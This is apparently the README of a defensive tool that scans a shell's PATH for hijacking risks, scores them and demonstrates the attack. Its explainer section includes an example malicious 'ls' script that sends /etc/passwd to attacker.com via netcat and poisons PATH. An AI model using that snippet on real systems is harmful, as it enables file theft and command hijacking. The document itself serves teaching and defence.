# GhostPath — Real-Time Dev Environment Security Auditor

> **Detect PATH hijacking vulnerabilities in your development environment before an attacker does.**

GhostPath is a real-time security auditing tool that scans your shell's PATH environment for exploitable misconfigurations, scores risk severity, and demonstrates the attack chain live — so developers can see exactly how they're vulnerable.

Built from scratch using bash scripts, a Python FastAPI backend, and a terminal-style frontend. Every detection is based on real attack vectors, not simulated findings.

---

## What it detects

| Finding | Severity | Risk |
|---|---|---|
| Current directory `.` in PATH | CRITICAL | Any directory you enter can hijack commands |
| Non-root owned PATH directories | CRITICAL | Attacker can plant malicious binaries |
| Duplicate PATH entries | WARN | Indicates PATH manipulation has occurred |
| Non-existent PATH directories | WARN | Broken environment, possible tampering |

---

## Live demo

**Scan — detecting real vulnerabilities:**

The scanner runs against your actual environment and returns a scored risk assessment. Every finding is a genuine detection, not a mock result.

```
RISK SCORE: 7/10

CRITICAL: '.' in PATH allows command hijacking
CRITICAL: /path/to/venv/bin is writable
WARN: duplicate PATH entry /snap/bin
```

**Exploit — simulating the attack chain:**

```
Binary planted     → DONE
PATH hijack triggered → DONE  
Command execution hijacked → SUCCESS
```

The exploit simulation plants a fake binary in a PATH-controlled directory and executes it — demonstrating exactly how an attacker would take over your terminal.

---

## Architecture

```
bash scripts (data collection layer)
      ↓  --json flag
executor.py (subprocess runner, timing, error handling)
      ↓
risk_engine.py (scoring: CRITICAL=3pts, WARN=1pt, cap 10)
      ↓
main.py — FastAPI (HTTP endpoints with CORS)
      ↓
index.html — terminal-style frontend (fetch API)
```

The bash scripts do the actual security work. The Python layer scores and exposes results. The frontend visualises them. Each layer is independently testable.

---

## Project structure

```
Real-Time-Dev-Environment-Security-Auditor/
├── backend/
│   ├── main.py              ← FastAPI app, CORS, endpoint routing
│   ├── executor.py          ← subprocess runner, timing, JSON parsing
│   └── risk_engine.py       ← risk scoring engine, vulnerability detection
├── scripts/
│   ├── path_auditor_hackathon.sh  ← PATH security scanner, JSON output
│   └── path_hijack_demo.sh        ← attack chain simulation
├── frontend/
│   └── index.html           ← terminal-style dashboard
└── README.md
```

---

## API endpoints

| Endpoint | Method | Description |
|---|---|---|
| `/api/audit/path` | GET | Run PATH security scan, return scored results |
| `/api/simulate/attack` | GET | Execute PATH hijack simulation |
| `/api/summary` | GET | Overall risk summary with vulnerability status |

---

## Setup

**Requirements:**
- Linux (Ubuntu 20.04+)
- Python 3.8+
- bash

**Install:**
```bash
git clone https://github.com/akshit1473/Real-Time-Dev-Environment-Security-Auditor
cd Real-Time-Dev-Environment-Security-Auditor
pip install -r requirements.txt
```

**Run:**
```bash
uvicorn backend.main:app --reload --host 0.0.0.0 --port 8000
```

**Open in browser:**
```
http://localhost:8000
```

**Test endpoints directly:**
```bash
curl http://localhost:8000/api/audit/path
curl http://localhost:8000/api/summary
```

---

## Run scripts standalone

```bash
# PATH audit — CLI output
bash scripts/path_auditor_hackathon.sh

# PATH audit — JSON output (consumed by API)
bash scripts/path_auditor_hackathon.sh --json

# Attack simulation
bash scripts/path_hijack_demo.sh
```

---

## Risk scoring

```
CRITICAL finding  →  +3 points
WARN finding      →  +1 point
Maximum score     →  10 points

Score 0      →  CLEAN
Score 1-3    →  MEDIUM
Score 4-6    →  HIGH  
Score 7-10   →  CRITICAL
```

---

## The attack this detects

PATH hijacking is a privilege escalation technique where an attacker places a malicious binary — named after a common command like `ls` or `python3` — in a directory that appears early in your PATH. When you run that command, the attacker's version executes instead.

```bash
# attacker plants malicious binary
echo '#!/bin/bash
cat /etc/passwd | nc attacker.com 4444
/bin/ls "$@"' > /tmp/ls
chmod +x /tmp/ls

# attacker poisons PATH
export PATH=/tmp:$PATH

# victim runs ls — gets malicious version
# real ls output appears, attack already executed
ls
```

GhostPath detects the conditions that make this attack possible — before it happens.

---

## Security notes

- Scripts set a hardened internal PATH before execution to prevent the auditor itself from being hijacked
- CORS is configured for development — restrict `allow_origins` in production deployment
- The exploit simulation runs in a sandboxed context — no persistent system changes are made

---

## Status

| Component | Status |
|---|---|
| PATH security scanner | Complete |
| Risk scoring engine | Complete |
| Attack simulation | Complete |
| Terminal-style frontend | Complete |
| Live deployment | Upcoming |
| Remediation suggestions | Planned |

---

